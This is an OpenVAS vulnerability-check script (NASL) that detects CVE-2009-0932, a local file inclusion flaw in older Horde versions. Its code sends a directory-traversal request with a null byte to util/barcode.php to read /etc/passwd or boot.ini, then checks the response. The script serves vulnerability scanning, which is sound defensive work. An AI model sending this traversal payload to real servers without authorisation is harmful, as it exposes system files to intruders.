###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_horde_lfi_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Horde Products Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to include and execute
  arbitrary local files via directory traversal sequences in the Horde_Image
  driver name.
  Impact Level: Application";
tag_affected = "Horde versions before 3.2.4 and 3.3.3
  Horde Groupware versions before 1.1.5";
tag_insight = "The flaw is caused by improper validation of user-supplied input to the
  'driver' argument of the 'Horde_Image::factory' method before using it to
  include PHP code in 'lib/Horde/Image.php'.";
tag_solution = "Upgarade to Horde 3.2.4 or 3.3.3 and Horde Groupware 1.1.5.
  For updates refer to http://www.horde.org/download/";
tag_summary = "The host is running Horde and is prone to local file inclusion
  vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801849");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-02-17 16:08:28 +0100 (Thu, 17 Feb 2011)");
  script_cve_id("CVE-2009-0932");
  script_bugtraq_id(33491);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_name("Horde Products Local File Inclusion Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/33695");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/98424/horde-lfi.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("horde_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("horde/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

if(dir = get_dir_from_kb(port:port,app:"horde"))
{
  foreach file (make_list("/etc/passwd","boot.ini"))
  {
    ## Construct The Attack Request
    url = string(dir, "/util/barcode.php?type=../../../../../../../../../../..",
                      file,"%00");

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, pattern:"(root:.*:0:[01]:|\[boot loader\])"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}
